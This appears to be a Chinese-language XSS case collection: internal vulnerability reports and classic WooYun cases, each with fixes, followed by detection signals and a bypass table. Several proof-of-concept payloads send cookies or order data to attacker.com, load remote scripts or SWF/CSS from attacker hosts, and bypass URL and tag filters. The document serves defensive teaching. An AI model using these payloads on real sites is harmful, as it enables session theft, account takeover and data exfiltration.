# XSS 案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

### 案例1：存在 CVE-2024-4367 存储 XSS 问题（PDF.js 组件漏洞）

**系统**: 某内部系统

**漏洞描述**:
PDF.js 是 Mozilla 开发、用于预览 PDF 的 JavaScript 组件，是 Mozilla Firefox 浏览器中内置的 PDF 查看器。在受影响版本中，由于 PDF.js 处理字体时对 fontMatrix 数组校验不严，攻击者可以构造恶意的 PDF 文件，执行任意 JavaScript 代码。漏洞同时影响 Firefox 和 Electron 类应用，对于 Electron 类客户端应用，当用户预览攻击者发送的恶意 PDF 文件时，将在本地执行任意代码，可能导致数据泄漏或权限被获取。

**技术细节**:
- 组件：`pdfjs-dist`（PDF.js 的 npm 发布包）
- 触发点：PDF 文件中的 fontMatrix 数组字段校验缺失
- 影响范围：基于 Electron 的客户端应用 + Firefox 浏览器
- 漏洞标识：CVE-2024-4367
- 攻击向量：攻击者构造恶意 PDF 文件，诱导用户打开即可触发代码执行

**修复方案**:
- 将 `pdfjs-dist` 升级至 4.2.67 及以上版本
- 将 Firefox 升级至 126 及以上版本
- 将 Firefox ESR 升级至 115.11 及以上版本

**经验总结**:
富文本内容需使用白名单过滤器（如 OWASP AntiSamy、DOMPurify）处理，仅允许安全的 HTML 标签；第三方文件处理组件需及时关注 CVE 并保持版本更新。

---

### 案例2：某内部系统文档存储 XSS + 1-click 蠕虫（伪协议绕过）

**系统**: 某内部系统

**漏洞描述**:
文档编辑页面，选择"添加页面"功能时，可掺入特殊构造的 payload：`javascript://a@m.hao123.com/?%0dalert(1);%0d`，利用换行符绕过 URL 协议检测，形成存储型 XSS。利用受限条件：仅能编辑自己的文档，需分享给他人才能实施攻击；无法获取关键 Cookie。

**技术细节**:
- 注入点：文档"添加页面"功能中的 URL 超链接字段
- 绕过方式：`javascript://` 伪协议 + `%0d`（回车符）绕过 URL 前缀检测
- Payload：`javascript://a@m.hao123.com/?%0dalert(1);%0d`
- 漏洞类型：存储型 XSS，具备 1-click 蠕虫传播潜力
- 影响范围：文档分享后，所有查看者均受影响

**修复方案**:
做好对伪协议的严格检查，URL 字段仅允许 `http://` 或 `https://` 开头，并对 `%0a`、`%0d` 等编码换行符进行过滤，防止 `javascript:` 伪协议绕过。

**经验总结**:
前端渲染用户输入时需使用 `textContent` 而非 `innerHTML`，避免 DOM-XSS；超链接 URL 字段需在后端进行协议白名单校验，前端校验可被绕过。

---

### 案例3：KIM 客户端 XSS 导致命令执行 RCE（Electron 高危链）

**系统**: 某内部系统

**漏洞描述**:
KIM（当前最新版本 3.4.1-(0720_42545)）在定时消息处未对 `iframe` 元素的 `src` 属性做检查，导致存储型 XSS。又因 KIM 使用 Electron 技术构建客户端，XSS 后可以执行客户端命令，最终可以获取 PC 客户端（Windows/Mac）的命令执行权限。

**技术细节**:
- 注入点：定时消息功能中的 `iframe.src` 属性
- 漏洞类型：存储型 XSS → Electron RCE 攻击链
- 危害升级：Electron 应用中 XSS 可突破浏览器沙箱，直接调用 Node.js API 执行系统命令
- 影响平台：Windows / macOS 双端 PC 客户端
- 严重程度：高危（直接导致本地代码执行）

**修复方案**:
- 修复存储型 XSS：对 `iframe.src` 等属性进行严格 URL 白名单校验
- 彻底收敛命令执行问题：Electron 应用中禁用 `nodeIntegration`，启用 `contextIsolation`，使用 CSP 限制脚本来源

**经验总结**:
存储型 XSS 在输入时过滤、输出时转义应两步同时执行，单靠一方防御存在绕过风险；Electron 应用需特别注意 XSS 的影响范围已超出浏览器级别，必须配置 `nodeIntegration: false`。

---

### 案例4：某内部系统超链接插入 javascript 伪协议导致存储 XSS

**系统**: 某内部系统

**漏洞描述**:
文档编辑接口中，超链接功能未对插入内容进行协议检查，可插入 `javascript:` 伪协议，造成存储型 XSS。利用受限条件：只能编辑自己的文档，需要分享给他人才可影响他人；无法获取到用户身份标识 K-Uims-Token-More，获取到的都是无用 Cookie。

**技术细节**:
- 注入点：文档编辑接口的超链接 URL 参数
- Payload 类型：`javascript:alert(document.cookie)` 等伪协议
- 后端接口：文档编辑 API（具体路径已知）
- 漏洞触发：他人点击分享文档中的超链接即触发
- 无法获取高价值 Cookie（K-Uims-Token-More），危害相对受限

**修复方案**:
严格检查传入 URL 的格式，只允许 `http://` 或 `https://` 开头，在后端入库前进行协议正则校验，拒绝 `javascript:`、`data:`、`vbscript:` 等危险协议。

**经验总结**:
HTTP 响应头需设置正确的 `Content-Type` 和 `charset`，防止字符集相关的 XSS 绕过；A 标签的 `href` 属性需后端校验协议，前端校验不可信。

---

### 案例5：问答/投票/帖子系统多处存储 XSS（批量排查场景）

**系统**: 某内部系统

**漏洞描述**:
多处可输入文本的接口均存在存储型 XSS 问题。发现于：发布提问、发布回答、发布投票，同时发布帖子、帖子中发布评论功能亦存在。排查要点：前端对输入特殊字符（左右尖括号等）进行转义后发送往服务端的接口均可能存在问题，说明后端未做二次过滤。

**技术细节**:
- 影响接口：提问、回答、投票、帖子、评论等多处富文本输入点
- 根本原因：仅依赖前端 JS 转义，服务端未做 HTML 实体化处理
- 漏洞模式：绕过前端过滤后直接 POST 到接口可写入任意 HTML/JS
- 排查方式：逐一测试含富文本输入的接口，直接发包（绕过前端）

**修复方案**:
建议接入安全组 CSP 策略统一解决 XSS 问题；后端统一添加 HTML 输入过滤中间件，使用 DOMPurify 或 AntiSamy 处理富文本内容。

**经验总结**:
JSON 响应中如包含用户输入，需确保 `Content-Type` 为 `application/json` 而非 `text/html`；任何富文本场景必须在服务端做输出转义，前端过滤不可信。

---

### 案例6：DSP 系统 attachUrl 参数 XSS（URL 字段未校验协议）

**系统**: 某内部系统

**漏洞描述**:
某内部系统中，`/rest/dsp/agent/secondary/add` 和 `/rest/dsp/agent/secondary/update` 两个接口的 `"protocol"-"attachUrl"` 及 `"attachList"-"attachUrl"` 参数存在 XSS 漏洞，可注入 `javascript:` 伪协议或恶意 URL。

**技术细节**:
- 漏洞接口：`POST /rest/dsp/agent/secondary/add`、`POST /rest/dsp/agent/secondary/update`
- 漏洞参数：`attachUrl`（位于 `protocol` 和 `attachList` 对象内）
- 触发方式：将 `attachUrl` 值设置为 `javascript:alert(1)` 或含 XSS 的 URL
- 后端未对 URL 字段进行协议格式校验

**修复方案**:
后端校验 `attachUrl` 字段只能是以 `https://` 或 `http://` 开头的合法地址，如需支持其他域名，需加入明确白名单。

**经验总结**:
SVG 文件上传可能导致 XSS，需在服务端校验文件内容而不仅仅是扩展名；URL 类参数的后端协议校验是防范伪协议注入的关键。

---

### 案例7：安全修复措施在代码重构后丢失（修复回归漏洞）

**系统**: 某内部系统

**漏洞描述**:
之前已修复的 XSS 漏洞在代码重构时，安全修复措施遗失。原漏洞（VUL-202208-223）定级为中危，修复后在入口侧过滤了危险字符（解决新增问题），各业务处理存量的防护（存量）。重构后未携带安全修复代码，导致漏洞重新出现，降级为低危。

**技术细节**:
- 漏洞位置：个人签名功能（仅一个入口，位于主站侧）
- 原修复方式：在入口侧过滤危险字符
- 回归原因：代码重构时安全修复代码未同步迁移
- 问题模式：安全修复与业务代码耦合度不足，重构易丢失

**修复方案**:
重新添加之前的安全修复措施；建议将 XSS 过滤逻辑抽象为公共中间件或工具函数，避免与业务逻辑耦合，减少重构时丢失的风险。

**经验总结**:
反射型 XSS 通常通过诱导点击恶意链接触发，需对所有 URL 参数做 HTML 编码输出；安全修复代码应通过单元测试固化，避免重构回归。

---

### 案例8：DSP 系统 reportLink 参数 XSS（URL 协议未限制）

**系统**: 某内部系统

**漏洞描述**:
某内部系统中，`/rest/dsp/agent/operate/report/submit` 和 `/rest/dsp/agent/operate/reportFile/upload/async` 两个接口的 `reportLink` 参数存在 XSS 漏洞，可注入 `javascript:` 等伪协议。

**技术细节**:
- 漏洞接口：`/rest/dsp/agent/operate/report/submit`、`/rest/dsp/agent/operate/reportFile/upload/async`
- 漏洞参数：`reportLink`
- 触发方式：`reportLink` 赋值为 `javascript:alert(document.cookie)`，在前端渲染为可点击链接时触发
- 根本原因：后端未对 `reportLink` 参数做协议白名单校验

**修复方案**:
后端校验 `reportLink` 字段只能是 `https://` 或 `http://` 开头的合法 URL，拒绝其他协议前缀。

**经验总结**:
CSP（`Content-Security-Policy`）头可作为 XSS 的纵深防御，限制脚本执行来源；URL 参数的 `javascript:` 协议注入是常被忽略的 XSS 攻击面。

---

### 案例9：问卷系统 XFF 头存储 XSS（可钓鱼内网）

**系统**: 某内部系统

**漏洞描述**:
答题人可修改 `X-Forwarded-For`（XFF）头为 XSS payload，待问卷管理员访问答题页面后，即可触发 XSS 攻击。危害：可盗取员工 Cookie、钓鱼入侵内网；结合问卷编辑处的存储型 XSS，可将受影响范围从问卷管理员扩大到所有访问问卷的人员。

**技术细节**:
- 注入点：HTTP 请求头 `X-Forwarded-For`（答题时记录 IP 的字段）
- 触发方式：管理员访问答题结果页面时，XFF 值被反显并执行
- 攻击链：答题人提交恶意 XFF → 数据写入数据库 → 管理员查看结果页触发
- 扩大化：结合问卷编辑 XSS 可实现蠕虫级别传播
- 危害：内网 Cookie 劫持、钓鱼攻击

**修复方案**:
对从 HTTP 请求头（`X-Forwarded-For`、`User-Agent`、`Referer` 等）读取的值进行 HTML 实体化处理，禁止将请求头内容直接写入数据库并在页面回显。

**经验总结**:
JS 模板引擎的双括号表达式可能导致 XSS，需区分安全与不安全的插值方式；HTTP 请求头同样是 XSS 的注入面，不可忽视。

---

### 案例10：快小店订单售后页 HTML 注入（钓鱼风险）

**系统**: 某内部系统

**漏洞描述**:
快小店订单售后页存在 HTML 注入，存在钓鱼风险。特点：无法执行 JS（不构成完整 XSS）；但可注入任意 HTML 内容，视觉上可伪造页面进行钓鱼。利用条件较高，视角反常，可利用性相对较低，定级为低危。

**技术细节**:
- 注入点：订单售后页某用户可控字段
- 漏洞类型：HTML 注入（非完整 XSS，JS 执行被阻止）
- 实际危害：可通过注入 HTML 伪造页面内容，实施钓鱼攻击
- 触发条件：需诱导用户访问特定订单售后页
- 局限性：无法执行 JS，不能直接窃取 Cookie

**修复方案**:
对用户输入进行 HTML 转义，防止用户输入被渲染为 HTML 标签，即使不能执行 JS，HTML 注入本身也会带来钓鱼风险。

**经验总结**:
A 标签的 `href` 属性需校验协议，防止 `javascript:` 伪协议执行 XSS；HTML 注入虽不能执行脚本，但可用于伪造页面、钓鱼欺骗，不可忽视。

---

## 二、业界经典案例（乌云）

### 案例1：搜狗储存型 XSS + CSRF 组合攻击

**厂商**: 搜狗 | **类型**: 存储型 XSS + CSRF

**洞察**: 搜狗平台存储型 XSS 可配合 CSRF 实现组合攻击，危害从单用户扩展到平台级别。

**测试流程**:
1. 在个人信息/昵称处输入 XSS payload
2. 确认 payload 被存储并在他人页面执行
3. 构造 CSRF 表单结合 XSS 触发
4. 验证攻击链完整性

**技术细节**:
参数 `w`/`kwd`/`sohuurl` 未过滤，存储型 XSS 可配合 CSRF 实现更大危害。XSS 负责突破同源策略，CSRF 负责利用受害者身份发起操作，两者配合可实现账号接管等高危利用。

**POC 示例**:
```html
<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>
```

**绕过技巧**: 利用 HTML 属性注入：`"><img src=x onerror=alert(1)>`

**修复建议**: 对存储内容进行 HTML 实体编码，输出时使用 contextual escaping，添加 CSP 响应头；CSRF Token 用于防范 CSRF 组合攻击。

---

### 案例2：某分类信息网站跨端存储 XSS（WAP 写入 PC 执行）

**厂商**: 某分类信息网站 | **类型**: 存储型 XSS（WAP 侧写入，PC 侧执行）

**洞察**: WAP 页面发布的内容会同步显示在 PC 端主站，在 WAP 侧的 XSS 可导致 PC 端管理员被攻击，形成跨端污染。

**测试流程**:
1. 通过 WAP 页面发布简历，在个人说明处注入 payload
2. 验证内容是否显示在 PC 端主站
3. 确认 payload 在 PC 端执行
4. 尝试钓取管理员 Cookie

**技术细节**:
WAP 端发布信息，PC 端展示，跨端存储型 XSS。在个人说明处未进行过滤。同时，管理员审核时也会执行 XSS，可直接获取管理员 Cookie。WAP 端的安全检查通常比 PC 端宽松，是常见的防护盲区。

**POC 示例**:
```html
<script>new Image().src='http://attacker.com/x?'+document.cookie</script>
```

**绕过技巧**: WAP 端过滤通常比 PC 端宽松，利用此差异绕过安全检测。

**修复建议**: 统一前后端输入过滤规则，WAP 和 PC 共用相同的 XSS 防护逻辑，在服务端统一处理。

---

### 案例3：饭桶网存储 XSS 劫持管理员进入后台

**厂商**: 饭桶网 | **类型**: 存储型 XSS（钓鱼管理员）

**洞察**: 利用存储型 XSS 钓取管理员 Cookie，实现后台越权访问，是最经典的 XSS 实际危害路径。

**测试流程**:
1. 在用户发帖/评论处注入 XSS payload
2. 等待管理员审核或浏览内容
3. 收集管理员 Cookie
4. 使用 Cookie 进入管理后台

**技术细节**:
评论/帖子处存储型 XSS，管理员审核时触发，可获取管理员 session。核心利用：攻击者在低权限用户界面写入，高权限管理员阅读时触发，实现权限提升。

**POC 示例**:
```javascript
<script>document.write('<img src="http://attacker.com/?c='+escape(document.cookie)+'">')</script>
```

**绕过技巧**: 无特殊绕过，利用管理员审核页面必然触发的特性。

**修复建议**: 对 XSS 存储内容使用 HTMLPurifier 过滤，管理后台添加二次验证，重要操作需重新输入密码；即使 Cookie 被窃取也无法直接操作。

---

### 案例4：汽车之家论坛 embed 标签 XSS（Flash SWF 执行 JS）

**厂商**: 汽车之家 | **类型**: 存储型 XSS（Flash 嵌入执行 JS）

**洞察**: 论坛 `embed` 标签未过滤 `allowscriptaccess` 属性，通过加载恶意 SWF 文件执行任意 JavaScript，可蠕虫传播。

**测试流程**:
1. 在论坛帖子中插入 `embed` 标签
2. 设置 `allowscriptaccess=always`
3. SWF 文件中执行 JavaScript 代码
4. 实现蠕虫传播或 CSRF 攻击

**技术细节**:
`embed` 标签加载外部 SWF 文件，修改 `allowscriptaccess=always` 可执行 SWF 中的 JS 代码，可实现蠕虫、CSRF。这是一种经典的通过媒体嵌入标签绕过 XSS 过滤的方式，属于 Flash 时代的高危利用模式。

**POC 示例**:
```html
<embed src="http://attacker.com/xss.swf" allowscriptaccess="always" width="1" height="1">
```

**绕过技巧**: 通过 SWF 文件绕过基于 HTML 标签内容的 XSS 过滤器，恶意代码藏于 Flash 文件中。

**修复建议**: 过滤 `embed`/`object`/`applet` 等嵌入标签，禁止 `allowscriptaccess=always` 属性；现代应用应完全禁止 Flash 相关内容。

---

### 案例5：大街网 portraiturl 参数存储 XSS 蠕虫（首页传播）

**厂商**: 大街网 | **类型**: 存储型 XSS 蠕虫

**洞察**: 大街网个人资料中的 `portraiturl` 参数注入 XSS 后，在首页等高流量页面展示，实现蠕虫式传播。

**测试流程**:
1. 修改个人头像 URL 为 XSS payload
2. 观察是否在他人页面（如首页）显示
3. 确认蠕虫传播效果
4. 利用蠕虫批量收集 Cookie

**技术细节**:
`portraiturl` 参数存在 XSS，影响首页展示，可实现蠕虫传播。头像 URL 字段被后端直接写入 HTML，未做协议校验或 HTML 转义。由于首页展示所有用户的头像，一旦一个账号被感染，XSS 可自动感染查看者账号，实现指数级传播。

**POC 示例**:
```
portraiturl 字段值："><script src=//attacker.com/xss.js></script>
```

**绕过技巧**: 利用外部 JS 文件加载绕过内容长度限制，XSS payload 本体很短。

**修复建议**: 对 URL 类参数验证格式（必须是图片 URL，验证域名白名单），输出时进行 HTML 编码；图片 URL 字段应有严格的格式校验。

---

### 案例6：酒仙网反射 XSS + 160 万订单数据泄露

**厂商**: 酒仙网 | **类型**: 反射型 XSS + 信息泄露

**洞察**: 电商主站 XSS 可配合订单信息泄露，实现大规模数据窃取，XSS 漏洞的实际危害远超简单弹窗演示。

**测试流程**:
1. 发现反射型 XSS 参数
2. 构造包含 Cookie 窃取代码的 XSS payload
3. 利用 XSS 访问管理后台接口
4. 批量获取订单数据

**技术细节**:
酒仙网官网存在反射型 XSS，配合订单接口未授权访问，可获取 160 多万条订单数据及后台地址。XSS 执行后，攻击者脚本在受害者浏览器中运行，同源策略自动携带 Cookie 访问后台接口，实现数据盗取。

**POC 示例**:
```javascript
<script>fetch('/api/orders').then(r=>r.json()).then(d=>fetch('//attacker.com/?d='+btoa(JSON.stringify(d))))</script>
```

**绕过技巧**: 无特殊绕过，利用接口未授权访问与 XSS 同源访问的组合。

**修复建议**: 修复 XSS 漏洞，订单接口添加严格身份验证，敏感接口添加 CSRF Token；纵深防御，任一层面单独防御不足。

---

### 案例7：ITPUB 博客发帖存储 XSS 钓取 admin Cookie

**厂商**: ITPUB | **类型**: 存储型 XSS（博客发帖）

**洞察**: 技术论坛博客发帖处的存储型 XSS，管理员频繁查看帖子，实际已成功获取官方 admin Cookie。

**测试流程**:
1. 在博客发帖编辑器中注入 XSS
2. 发布含 XSS 的帖子
3. 等待管理员查看
4. 收集管理员 Cookie 并登录后台

**技术细节**:
ITPUB 博客发帖处存储型 XSS，目标是技术社区管理员，已成功获取 admin 级别 Cookie。技术论坛管理员会频繁审核帖子内容，是存储 XSS 的高价值触发目标。

**POC 示例**:
```html
<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie;this.onerror=null">
```

**绕过技巧**: `img` 标签 `onerror` 属性绕过对 `<script>` 标签的过滤，是最常用的 XSS 绕过手法之一。

**修复建议**: 博客/帖子内容使用白名单 HTML 标签过滤，禁止 `onerror`/`onload` 等事件属性；推荐使用 HTMLPurifier 进行服务端过滤。

---

### 案例8：Coremail 邮件系统存储 XSS（CSS Import 绕过）

**厂商**: Coremail 邮件系统 | **类型**: 存储型 XSS（邮件系统）

**洞察**: 企业邮件系统存储型 XSS 危害极大，可批量钓取企业员工邮件账号，企业邮件往往关联内网 VPN 等高权限系统。

**测试流程**:
1. 发送含 XSS payload 的邮件
2. 接收方打开邮件触发 XSS
3. 收集企业员工 Cookie
4. 利用 Cookie 访问邮件系统内部接口

**技术细节**:
Coremail 邮件系统 GET 参数存在存储型 XSS，影响大量企业客户。利用 CSS `@import` 绕过了对 JavaScript 标签的过滤，CSS 文件中嵌入 JavaScript 表达式，在部分浏览器下可执行。

**POC 示例**:
```html
<style>@import 'http://attacker.com/xss.css';</style>
```

**绕过技巧**: CSS `@import` 绕过基于 JavaScript 标签的 XSS 过滤器，过滤了 `<script>` 标签仍不够安全。

**修复建议**: 邮件内容使用严格 HTML 净化，禁止 `style` 标签中的 `import` 指令，启用 CSP 限制外部资源加载；邮件场景建议使用最严格的白名单策略。

---

### 案例9：eYou 邮件系统 HTML5 autofocus XSS（无需点击触发）

**厂商**: eYou 邮件系统 | **类型**: 存储型 XSS（HTML5 autofocus）

**洞察**: 利用 HTML5 的 `autofocus` + `onfocus` 特性，在无需用户点击 JS 代码的情况下触发 XSS，绕过了需要用户交互的安全假设。

**测试流程**:
1. 在邮件正文中插入 HTML5 XSS payload
2. 发送给目标用户
3. 用户打开邮件后焦点自动触发 XSS

**技术细节**:
利用 `autofocus` 属性和 `onfocus` 事件无点击触发 XSS。`<select autofocus>` 元素在页面加载时自动获得焦点，立即触发 `onfocus` 事件处理器，完全不需要用户额外点击任何内容。

**POC 示例**:
```html
<select autofocus onfocus=alert(document.cookie)>
<textarea autofocus onfocus=alert(document.cookie)>
```

**绕过技巧**: HTML5 `autofocus`/`onfocus` 绕过对 `onclick` 等显式交互事件的过滤，防护方认为"需要用户点击"的假设被推翻。

**修复建议**: 禁止 `autofocus` 属性和 `onfocus` 等事件处理器；邮件系统应使用严格的 HTML 白名单，仅允许有限的展示性标签。

---

### 案例10：某国有银行反射 XSS + 官方域名钓鱼

**厂商**: 某国有银行 | **类型**: 反射型 XSS（钓鱼攻击）

**洞察**: 银行网站的反射型 XSS 可被用于制作官方域名下的钓鱼页面，欺骗用户输入银行凭证，可信度极高。

**测试流程**:
1. 在 `udefStr1`/`cityId` 参数中注入 payload
2. 确认 XSS 在银行官方域名下执行
3. 构造钓鱼页面替换银行登录界面
4. 获取用户银行账号密码

**技术细节**:
银行系统 `udefStr1` 和 `cityId` 参数未过滤，反射型 XSS 可在官方域名下执行，用于高可信钓鱼攻击。攻击者构造带有 XSS payload 的银行官方链接，受害者看到的是官方域名地址，极难识别钓鱼风险。

**POC 示例**:
```
GET /login?udefStr1="><script>alert(1)</script>&cityId=1 HTTP/1.1
```

**绕过技巧**: 双引号加尖括号：`"><script>alert(1)</script>`，最基础的 HTML 属性逃逸技巧。

**修复建议**: 输出编码，对所有反射参数进行 HTML 实体编码；金融系统对所有 URL 参数做统一的安全过滤是基本要求。

---

## 三、方法论总结

### 3.1 高频参数统计

根据以上案例统计，XSS 漏洞高频出现的参数类型：

| 参数类型 | 典型参数名 | 出现频次 | 风险等级 |
|---------|-----------|---------|---------|
| URL 链接字段 | `attachUrl`、`reportLink`、`portraiturl`、`href` | 4 次 | 高 |
| 富文本/内容字段 | 昵称、签名、帖子内容、邮件正文、个人说明 | 4 次 | 高 |
| HTTP 请求头 | `X-Forwarded-For`、`User-Agent` | 1 次 | 中 |
| 搜索/查询参数 | `w`、`kwd`、`udefStr1`、`cityId` | 2 次 | 中 |
| 文件路径/上传字段 | PDF 附件、SWF 嵌入 | 2 次 | 高 |

### 3.2 攻击模式分布

```
存储型 XSS（Stored XSS）         ████████████████  ~65%
  - 富文本编辑器注入
  - URL 字段伪协议注入
  - HTTP 头注入后存库
  - 文件/邮件载体

反射型 XSS（Reflected XSS）      ████████          ~25%
  - 搜索框参数回显
  - 登录跳转参数
  - 查询接口参数

DOM-XSS                          ███               ~10%
  - 前端路由参数
  - window.location 处理不当
```

**高危组合攻击模式**：
- **XSS + CSRF**：XSS 突破同源策略 + CSRF 利用身份执行操作 → 账号接管
- **XSS + Electron RCE**：浏览器级 XSS → Node.js 代码执行 → 本地系统控制
- **XSS + 未授权 API**：XSS 同源访问内部接口 → 大规模数据泄露
- **存储 XSS 蠕虫**：感染者自动感染查看者 → 指数级传播

### 3.3 关键检测信号

**代码层面检测信号**：
```
// 高危：innerHTML 赋值用户输入
element.innerHTML = userInput;
document.write(userInput);

// 高危：URL 字段未做协议校验
if (!url.startsWith('http')) { ... }  // 可被 javascript:// 绕过

// 高危：缺少输出转义
res.send(req.query.keyword);  // 直接反射
template.render({name: req.body.name});  // 模板注入
```

**HTTP 响应检测信号**：
- 响应 `Content-Type: text/html` 且包含用户输入
- 缺少 `X-XSS-Protection` 响应头
- 缺少 `Content-Security-Policy` 响应头
- 缺少 `X-Content-Type-Options: nosniff`

**业务逻辑检测信号**：
- 富文本编辑器（支持 HTML 输入的场景）
- URL 参数直接在页面中渲染为链接
- 用户个人资料（头像、签名、昵称）在他人页面展示
- 管理员查看用户提交内容的界面

### 3.4 常见绕过技巧

| 绕过技巧 | 原理 | 示例 |
|---------|------|------|
| `javascript:` 伪协议 | 绕过 URL 协议检查 | `javascript://host/?%0dalert(1)` |
| `onerror` 事件属性 | 绕过 `<script>` 标签过滤 | `<img src=x onerror=alert(1)>` |
| HTML5 autofocus | 无需用户点击触发 | `<input autofocus onfocus=alert(1)>` |
| CSS @import | 绕过 JS 内容过滤 | `<style>@import 'http://evil.com'</style>` |
| Flash allowscriptaccess | 通过 SWF 执行 JS | `<embed allowscriptaccess=always>` |
| 编码绕过 | 绕过字符过滤 | `%3cscript%3e`、`&#x3c;script&#x3e;` |
| WAP 端差异 | 利用 WAP/PC 过滤不一致 | 在 WAP 端写入，PC 端执行 |
| 外部 JS 加载 | 绕过长度限制 | `<script src=//attacker.com/x.js>` |
| 换行符绕过 | 绕过协议前缀检测 | `javascript://x%0aalert(1)` |
| `document.write` 拼接 | 绕过内容检测 | `document.write('<scr'+'ipt>...')` |
